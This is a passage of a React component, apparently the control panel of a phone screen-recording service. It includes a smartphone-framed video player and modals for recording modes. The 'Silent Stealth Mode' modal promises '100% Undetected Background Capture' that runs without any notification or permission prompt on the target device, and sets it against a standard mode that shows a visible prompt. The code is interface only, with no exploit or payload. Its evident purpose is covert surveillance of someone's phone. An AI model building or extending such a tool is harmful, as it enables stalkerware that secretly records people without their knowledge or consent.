                            {/* Inner Smartphone Screen */}
                            <div className="relative rounded-[32px] overflow-hidden bg-black aspect-[9/19] flex flex-col justify-between border border-black/80 shadow-2xl">
                                {/* Phone Status Bar + Dynamic Island Notch */}
                                <div className="absolute top-0 inset-x-0 z-30 pt-2 pb-2 px-4 flex items-center justify-between text-[11px] font-semibold text-white/90 select-none bg-gradient-to-b from-black/80 via-black/40 to-transparent pointer-events-none">
                                    <span className="font-mono text-[10px]">9:41</span>
                                    {/* Dynamic Island pill */}
                                    <div className="w-20 h-4 bg-black rounded-full flex items-center justify-center gap-1.5 shadow-[0_0_8px_rgba(0,0,0,0.8)] border border-white/5">
                                        <span className="w-1.5 h-1.5 rounded-full bg-[#1c1d22] ring-1 ring-white/10" />
                                        <span className="w-1.5 h-1.5 rounded-full bg-blue-950/80" />
                                    </div>
                                    <div className="flex items-center gap-1.5">
                                        <Wifi size={11} className="text-white/80" />
                                        <Battery size={13} className="text-white/80" />
                                    </div>
                                </div>

                                {/* Video Player in 9:19 screen */}
                                <div className="relative w-full h-full flex items-center justify-center bg-black">
                                    <video
                                        src={playingRec.url}
                                        controls
                                        autoPlay
                                        playsInline
                                        className="w-full h-full object-contain"
                                    />
                                </div>

                                {/* Bottom Home Indicator Bar */}
                                <div className="absolute bottom-1 inset-x-0 z-30 flex justify-center pointer-events-none pb-1 bg-gradient-to-t from-black/70 to-transparent">
                                    <div className="w-28 h-1 bg-white/40 rounded-full" />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* ── Stealth Mode Info / Takes Time Notice Modal ─────────────────── */}
            {showStealthNoticeModal && (
                <div className="fixed inset-0 z-[750] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
                    <div className="clay-card w-full max-w-sm p-5 border border-orange-500/30 space-y-4 animate-in zoom-in-95 duration-200 shadow-2xl">
                        <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-2xl bg-orange-500/15 border border-orange-500/30 flex items-center justify-center text-orange-400 shrink-0">
                                <Shield size={20} />
                            </div>
                            <div>
                                <h3 className="text-sm font-bold text-white tracking-tight">Silent Stealth Mode</h3>
                                <p className="text-[11px] text-orange-400/80 font-mono">100% Undetected Background Capture</p>
                            </div>
                        </div>

                        <div className="space-y-2 text-xs text-white/70 leading-relaxed bg-black/30 rounded-2xl p-3.5 border border-white/5">
                            <div className="flex items-start gap-2.5">
                                <Clock size={15} className="text-orange-400 mt-0.5 shrink-0" />
                                <p>
                                    <strong className="text-white">Takes a few moments:</strong> Because this runs silently without triggering any notification or prompt on the device, initial connection setup takes <span className="text-orange-400 font-bold">15–30 seconds</span>.
                                </p>
                            </div>
                            <div className="flex items-start gap-2.5">
                                <Sparkles size={15} className="text-amber-400 mt-0.5 shrink-0" />
                                <p>
                                    Once added to the queue, recording begins automatically the moment the phone screen is active.
                                </p>
                            </div>
                        </div>

                        <button
                            type="button"
                            onClick={() => {
                                setShowStealthNoticeModal(false);
                                if (typeof window !== 'undefined') {
                                    try { localStorage.setItem(STEALTH_SEEN_KEY, 'true'); } catch {}
                                }
                            }}
                            className="clay-cta-button w-full py-2.5 rounded-xl text-xs font-bold uppercase tracking-wider text-white shadow-lg cursor-pointer hover:scale-105 active:scale-95 transition-transform"
                        >
                            Understood, Continue
                        </button>
                    </div>
                </div>
            )}

            {/* ── Standard Mode Warning ──────────────────────────────────────── */}
            {showSimpleWarn && (
                <div className="fixed inset-0 z-[750] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
                    <div className="clay-card w-full max-w-sm p-5 border border-amber-500/25 space-y-4 animate-in zoom-in-95 duration-200 shadow-2xl">
                        <div className="flex items-center gap-2 text-amber-400">
                            <AlertTriangle size={16}/>
                            <span className="font-bold text-sm">Visible Permission Prompt</span>
                        </div>
                        <p className="text-xs text-white/60 leading-relaxed">
                            A <span className="text-white font-semibold">&quot;Start now?&quot;</span> prompt will appear on the device screen immediately.
                        </p>
                        <div className="flex gap-2">
                            <button 
                                type="button"
                                onClick={() => setShowSimpleWarn(false)}
                                className="flex-1 py-2.5 rounded-xl text-xs font-semibold text-white/50 border border-white/10 hover:border-white/20 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button 
                                type="button"
                                onClick={() => { setShowSimpleWarn(false); fireStart(); }}
                                className="clay-cta-button flex-1 py-2.5 rounded-xl text-xs font-bold uppercase tracking-wider text-white cursor-pointer"
                            >
                                Send Prompt
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* ── Continuous / Unlimited Warning ─────────────────────────────── */}
            {showUnlimWarn && (
                <div className="fixed inset-0 z-[750] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
                    <div className="clay-card w-full max-w-sm p-5 border border-rose-500/25 space-y-4 animate-in zoom-in-95 duration-200 shadow-2xl">
                        <div className="flex items-center gap-2 text-rose-400">
                            <AlertTriangle size={16}/>
                            <span className="font-bold text-sm">Continuous Recording</span>
                        </div>
                        <p className="text-xs text-white/60 leading-relaxed">
                            Continuous capture runs until explicitly stopped. High battery or performance impact may occur on older phones.
                        </p>
                        <div className="flex gap-2">
                            <button 
                                type="button"
                                onClick={() => setShowUnlimWarn(false)}
                                className="flex-1 py-2.5 rounded-xl text-xs font-semibold text-white/50 border border-white/10 hover:border-white/20 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button 
                                type="button"
                                onClick={() => { setShowUnlimWarn(false); fireStart(); }}
                                className="flex-1 py-2.5 rounded-xl text-xs font-bold bg-rose-600 hover:bg-rose-500 text-white transition-all cursor-pointer shadow-lg"
                            >
                                Start Anyway
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
